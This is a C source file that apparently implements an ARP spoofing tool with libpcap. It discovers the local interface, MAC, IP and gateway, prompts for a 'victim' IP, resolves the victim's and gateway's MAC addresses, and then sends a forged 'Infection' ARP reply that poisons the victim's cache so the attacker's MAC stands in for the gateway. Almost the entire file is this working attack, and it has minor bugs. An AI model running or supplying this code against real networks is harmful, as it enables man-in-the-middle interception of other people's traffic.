#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <pthread.h>
#include <net/if.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <pcap.h>

#define ARPPACKETSIZE 28
#define MACADDRLEN 18
#define IPADDRLEN 16

#pragma pack(push, 1)
struct ETH_Header {
	unsigned char DstMACAddr[6];
	unsigned char SrcMACAddr[6];
	unsigned short EtherType;
#define ETHERTYPEIP  0x0800
#define ETHERTYPEARP 0x0806
};

struct ARP_Header {
	unsigned short HardwareType;
#define HWTETHERNET 1
	unsigned short ProtocolType;
#define PROTOTYPEIP 0x0800
	unsigned char HardwareAddressLength;
	unsigned char ProtocolAddressLength;
#define IPV4SIZE 4
#define MACSIZE 6
	unsigned short OperationCode;
#define OP_REQUEST 1
#define OP_REPLY   2
	unsigned char SourceHardwareAddress[6];
	unsigned int SourceProtocolAddress;
	unsigned char TargetHardwareAddress[6];
	unsigned int TargetProtocolAddress;
};

struct PACKET_Header {
	struct ETH_Header ETH_Packet;
	struct ARP_Header ARP_Packet;
};

struct args {
	unsigned char* DestMACAddrHex;
	unsigned int SourceIPAddr;
};
#pragma pack(pop)

bool GetMyIPAddr(char*, unsigned int*);
bool GetMyMACAddr(char*, unsigned char*);
bool GetMyGatewayIPAddr(char*, unsigned int*);
void SetDefaultARP(struct ARP_Header*, unsigned char*, unsigned int, unsigned char*, unsigned int, int);
void SetDefailtETH(struct ETH_Header*, unsigned char*, unsigned char*);
bool SendARPPacket(char*, unsigned char*, unsigned int, unsigned int, unsigned int);
void* RecvARPPacket(void*);
int main(void) {
	struct in_addr inaddr;
	unsigned char MyMACAddrHex[6], VictimMACAddrHex[6], GatewayMACAddrHex[6];
	char MyMACAddrStr[MACADDRLEN] = { 0 }, VictimMACAddrStr[MACADDRLEN] = { 0 }, GatewayMACAddrStr[MACADDRLEN] = { 0 };
	unsigned int MyIPAddrHex, VictimIPAddrHex, GatewayIPAddrHex;
	char MyIPAddrStr[IPADDRLEN], VictimIPAddrStr[IPADDRLEN], GatewayIPAddrStr[IPADDRLEN];
	char* device, errbuf[PCAP_ERRBUF_SIZE];
	unsigned int net_hex, subnet_hex;
	int fd;

	// Get Network Interface Name
	device = pcap_lookupdev(errbuf);
	if (device == NULL) {
		printf("error in lookupdev()\n");
		printf("%s\n", errbuf);
		return -1;
	}
	printf("Network Interface : %s\n", device);

	// Get My IP Address
	if (GetMyIPAddr(device, &MyIPAddrHex) == false) {
		printf("Can't get my IP address\n");
		return -1;
	}
	inaddr.s_addr = MyIPAddrHex;
	inet_ntop(AF_INET, &inaddr, MyIPAddrStr, IPADDRLEN);
	
	// Get My MAC Address
	if (GetMyMACAddr(device, MyMACAddrHex) == false) {
		printf("Can't get my MAC address\n");
		return -1;
	}
	for (int i = 0; i < MACSIZE; i++) 
		sprintf(MyMACAddrStr, "%s%02x%s", MyMACAddrStr, MyMACAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
	
	// Get Gateway's IP Address
	if (GetMyGatewayIPAddr(device, &GatewayIPAddrHex) == false) {
		printf("Can't get my Gateway IP address\n");
		return -1;
	}
	inaddr.s_addr = GatewayIPAddrHex;
	inet_ntop(AF_INET, &inaddr, GatewayIPAddrStr, IPADDRLEN);

	// Print Information
	printf("MAC Address : %s\n", MyMACAddrStr);
	printf("IP Address : %s\n", MyIPAddrStr);
	printf("Gateway IP Address : %s\n", GatewayIPAddrStr);

	// Get Victim IP Address from User
	printf("\nInput victim's IP Address : ");
	fgets(VictimIPAddrStr, IPADDRLEN, stdin);
	VictimIPAddrHex = inet_addr(VictimIPAddrStr);
	
	// Send ARP Packet to Victim, Gateway for Getting Victim, Gateway's MAC Address
	if (SendARPPacket(device, MyMACAddrHex, MyIPAddrHex, VictimIPAddrHex, GatewayIPAddrHex) == false) {
		printf("Cat't send ARP_REQUEST Packet\n");
		return -1;
	}
	// printf("\nVictim MAC Address : %s\n", VictimMACAddrStr);
	// printf("Gateway MAC Address : %s\n", GatewayMACAddrStr);

	return 0;
}

bool GetMyIPAddr(char* device, unsigned int* IPAddr) {
	struct ifaddrs *ifaddr, *ifa;
	struct sockaddr_in* inaddr;
	int family, s;

	if (getifaddrs(&ifaddr) == -1) {
		perror("Error in getifaddrs()\n");
		exit(-1);
	}

	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr == NULL) 
			continue;

		if ((strcmp(ifa->ifa_name, device) == 0) && (ifa->ifa_addr->sa_family == AF_INET)) {
			inaddr = (struct sockaddr_in*)ifa->ifa_addr;
			*IPAddr = inaddr->sin_addr.s_addr;

			freeifaddrs(ifaddr);
			return true;
		}
	}

	freeifaddrs(ifaddr);
	return false;
}

bool GetMyMACAddr(char* device, unsigned char* MACAddr) {
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, device, strlen(device));
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
		memcpy(MACAddr, ifr.ifr_hwaddr.sa_data, MACSIZE);
		close(fd);

		return true;
	}
	close(fd);

	return false;
}

bool GetMyGatewayIPAddr(char* device, unsigned int* GatewayIPAddrHex) {
	struct in_addr inaddr;
	unsigned int Gateway_hex;
	char *interface = NULL, *Gateway = NULL;
	char line[100];
	FILE* fp;

	fp = fopen("/proc/net/route", "rt");
	if (fp == NULL) {
		printf("can't open /proc/net/route\n");
		return false;
	}

	while (fgets(line, 100, fp)) {
		interface = strtok(line, "\t");
		if (strcmp(interface, device) != 0) 
			continue;

		for (int i = 0; i < 2; i++) 
			Gateway = strtok(NULL, "\t");

		if (strcmp(Gateway, "00000000") == 0) 
			continue;

		break;
	}
	*GatewayIPAddrHex = strtol(Gateway, NULL, 16);

	return true;
}

void SetDefaultARP(struct ARP_Header* packet, unsigned char* SourceMACAddr, unsigned int SourceIPAddr, unsigned char* DestMACAddr, unsigned int DestIPAddr, int Operation) {
	packet->HardwareType = htons(HWTETHERNET);
	packet->ProtocolType = htons(PROTOTYPEIP);
	packet->HardwareAddressLength = MACSIZE;
	packet->ProtocolAddressLength = IPV4SIZE;
	packet->OperationCode = htons(Operation);
	for (int i = 0; i < MACSIZE; i++) 
		packet->SourceHardwareAddress[i] = SourceMACAddr[i];
	packet->SourceProtocolAddress = SourceIPAddr;
	for (int i = 0; i < MACSIZE; i++)
		packet->TargetHardwareAddress[i] = DestMACAddr[i];
	packet->TargetProtocolAddress = DestIPAddr;
}

void SetDefaultETH(struct ETH_Header* packet, unsigned char* SourceMACAddr, unsigned char* DestMACAddr) {
	for (int i = 0; i < MACSIZE; i++) 
		packet->DstMACAddr[i] = DestMACAddr[i];
	for (int i = 0; i < MACSIZE; i++) 
		packet->SrcMACAddr[i] = SourceMACAddr[i];
	packet->EtherType = htons(ETHERTYPEARP);
}

bool SendARPPacket(char* device, unsigned char* MyMACAddrHex, unsigned int MyIPAddrHex, unsigned int VictimIPAddrHex, unsigned int GatewayIPAddrHex) {
	struct PACKET_Header Packet_Victim, Packet_Gateway, Infection;
	unsigned char *GatewayMACAddrHex, *VictimMACAddrHex;
	unsigned char ETHBroadCasting[MACSIZE] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }, ARPBroadCasting[MACSIZE] = { 0x00, };
	char errbuf[PCAP_ERRBUF_SIZE], GatewayMACAddrStr[MACADDRLEN], VictimMACAddrStr[MACADDRLEN];
	pthread_t pThread_Gateway, pThread_Victim;
	int Thread_Gateway, Thread_Victim, status;
	struct args pThread_args;
	pcap_t* handle;

	SetDefaultARP(&Packet_Victim.ARP_Packet, MyMACAddrHex, MyIPAddrHex, ARPBroadCasting, VictimIPAddrHex, OP_REQUEST);
	SetDefaultARP(&Packet_Gateway.ARP_Packet, MyMACAddrHex, MyIPAddrHex, ARPBroadCasting, GatewayIPAddrHex, OP_REQUEST);
	SetDefaultETH(&Packet_Victim.ETH_Packet, MyMACAddrHex, ETHBroadCasting);
	SetDefaultETH(&Packet_Gateway.ETH_Packet, MyMACAddrHex, ETHBroadCasting);

	handle = pcap_open_live(device, BUFSIZ, 0, 1000, errbuf);
	if (handle == NULL) {
		printf("error in pcap_open_live()\n");
		printf("%s\n", errbuf);
		return false;
	}

	pThread_args.DestMACAddrHex = MyMACAddrHex;
	pThread_args.SourceIPAddr = GatewayIPAddrHex;
	Thread_Gateway = pthread_create(&pThread_Gateway, NULL, RecvARPPacket, (void*)&pThread_args);
	if (Thread_Gateway < 0) {
		perror("pthread_create()");
		return false;
	}
	
	sleep(1);
	
	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Gateway, sizeof(struct PACKET_Header)) != 0) {
			perror("error in pcap_sendpacket()\n");
			return false;
	}
	pthread_join(pThread_Gateway, (void**)&GatewayMACAddrHex);

	for (int i = 0; i < MACSIZE; i++) 
		sprintf(GatewayMACAddrStr, "%s%02x%s", GatewayMACAddrStr, GatewayMACAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
	printf("\nGateway MAC Address : %s\n", GatewayMACAddrStr);

	pThread_args.SourceIPAddr = VictimIPAddrHex;
	Thread_Victim = pthread_create(&pThread_Victim, NULL, RecvARPPacket, (void*)&pThread_args);
	if (Thread_Victim < 0) {
		perror("pthread_create()\n");
		return false;
	}

	sleep(1);

	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Victim, sizeof(struct PACKET_Header)) != 0) {
			perror("error in pcap_sendpacket()\n");
			return false;
	}
	pthread_join(pThread_Victim, (void**)&VictimMACAddrHex);

	for (int i = 0; i < MACSIZE; i++) 
		sprintf(VictimMACAddrStr, "%s%02x%s", VictimMACAddrStr, VictimMACAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
	printf("Victim MAC Address : %s\n", VictimMACAddrStr);
	
	SetDefaultARP(&Infection.ARP_Packet, MyMACAddrHex, GatewayIPAddrHex, VictimMACAddrHex, VictimIPAddrHex, OP_REPLY);
	SetDefaultETH(&Infection.ETH_Packet, MyMACAddrHex, VictimMACAddrHex);
	
	printf("Sending Infection Packet to Victim\n");

	if (pcap_sendpacket(handle, (unsigned char*)&Infection, sizeof(struct PACKET_Header)) != 0) {
		perror("error in pcap_sendpacket()\n");
		return false;
	}

	return true;
}

void* RecvARPPacket(void* pThread_args) {
	unsigned char *DestMACAddrHex;
	char SourceMACAddr[MACADDRLEN] = { 0 };
	unsigned int net, mask, SourceIPAddr;
	char* device, filter[BUFSIZ];
	char errbuf[PCAP_ERRBUF_SIZE], DestMACAddrStr[MACADDRLEN];
	int ret;
	pcap_t* handle;
	pcap_pkthdr* pkthdr;
	PACKET_Header* packet;
	struct bpf_program fp;

	sleep(0.1);

	DestMACAddrHex = ((struct args*)pThread_args)->DestMACAddrHex;
	SourceIPAddr = ((struct args*)pThread_args)->SourceIPAddr;
	
	device = pcap_lookupdev(errbuf);
	if (device == NULL) {
		printf("error in lookupdev()\n");
		printf("%s\n", errbuf);
		return (void*)false;
	}
	
	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
		printf("error in lookupnet()\n");
		printf("%s\n", errbuf);
		return (void*)false;
	}

	handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
	if (handle == NULL) {
		printf("error in pcap_open_live()\n");
		printf("%s\n", errbuf);
		return (void*)false;
	}
	
	if (pcap_compile(handle, &fp, "ether proto \\arp", 0, net) == -1) {
		printf("compile error\n");
		return (void*)false;
	}

	if (pcap_setfilter(handle, &fp) == -1) {
		printf("setfilter error\n");
		return (void*)false;
	}
	while (1) {
		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
		if (ret == 0) 
			continue;
		else if (ret == -1) {
			printf("error in pcap_next_ex()\n");
			return (void*)false;
		}
		
		if ((ntohs(packet->ARP_Packet.OperationCode) == OP_REPLY) && (packet->ARP_Packet.SourceProtocolAddress == SourceIPAddr)) {
			for (int i = 0; i < MACSIZE; i++) 
				sprintf(SourceMACAddr, "%s%02x%s", SourceMACAddr, packet->ARP_Packet.SourceHardwareAddress[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
			
			return (void*)packet->ARP_Packet.SourceHardwareAddress;
		}
	}
	return (void*)false;
}

void callback(unsigned char* param, struct pkthdr* pkthdr, unsigned char* packet) {
}
